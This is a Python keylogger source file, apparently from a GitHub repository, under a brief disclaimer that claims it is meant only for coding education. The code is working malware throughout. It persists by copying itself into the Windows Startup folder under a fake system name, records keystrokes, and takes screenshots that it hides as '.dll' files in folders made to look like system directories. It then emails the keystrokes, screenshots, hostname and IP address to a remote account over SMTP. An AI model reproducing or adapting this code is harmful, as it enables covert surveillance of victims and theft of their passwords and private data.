#DISCLAMER! Do Not Use To Make Crimes. I Will Never Use To Bad Thinks, Especially To Infect School or EZN Pc's.
#Use it only to Coding Education.
#https://github.com/VeXo-Chrzan/PythonKeylogger
import keyboard
import time
import encodings
import os
import sys
from PIL import ImageGrab
import smtplib
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
import getpass
import random
import shutil
import winshell
import inspect

#Others
AntyDel = 0

#Tracking SYS
space = "___"
usr = socket.gethostname()
ip = socket.gethostbyname(socket.getfqdn())
sub = (str(usr)) + (str(space)) + (str(ip))

#Paths
snapshot = ImageGrab.grab()
path1 = "C:\\WindowsSys"
path2 = "C:\\WindowsSys\\SystemFiles"
path3 = "C:\\WindowsSys\\SystemFiles\\Private"
path4 = "C:\\WindowsSys\\SystemFiles\\Private\\Files"
path5 = "C:\\WindowsSys\\SystemFiles\\Private\\Files\\DLL"
FilePath = "C:\\WindowsSys\\SystemFiles\\Private\\Files\\DLL\\SS.png"

#Autostart
startup = winshell.startup()
VirusAutoStart = startup + '\\WinSys32DllMenager.py'
if not os.path.exists(VirusAutoStart) :
   shutil.copy('.\WinSys32DllMenager.py', startup)

#Keylogger loop
while True:

    #Png Smuggle Sysytem
    ArytmeticalHash = random.randint(1,100000)
    FP = random.uniform(0,1)
    AHFP = ArytmeticalHash + FP
    PngName = str(AHFP)
    PngNameLast = PngName + '.dll'
    NewFilePath = "C:\\WindowsSys\\SystemFiles\\Private\\Files\\DLL\\" + PngNameLast
    
    #Keyloggs
    rec = keyboard.record(until = 'enter')
      
    #PathVerification
    if os.path.exists(path5) :     
        im = ImageGrab.grab()
        im.save(FilePath)
    else:
         if not os.path.exists(path1) :
            os.mkdir(path1)
         if not os.path.exists(path2) :
            os.mkdir(path2)
         if not os.path.exists(path3) :
            os.mkdir(path3)
         if not os.path.exists(path4) :
            os.mkdir(path4)
         if not os.path.exists(path5) :
            os.mkdir(path5)
         if os.path.exists(path5) :
            im = ImageGrab.grab()
            im.save(FilePath)

       
    x = rec
    y = str(x)
    z = y.encode()

    #Email Setings
    email = 'Example@youremail.com'
    password = 'YourPassword'
    send_to_email = 'Example@yourseckondemail.com'
    subject = sub
    message = y
    file_location = FilePath

    #Mail Sending    
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = send_to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())   
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, send_to_email, text)
    server.quit()

    #Smuggle System
    attachment.close()
    os.rename(FilePath, NewFilePath)
    
    #AntyDel
    AntyDel = AntyDel + 1
    if AntyDel == 1:
       plik = open(NewFilePath, 'w')
       plik.write("Windows.Sys")
    
#https://github.com/VeXo-Chrzan/PythonKeylogger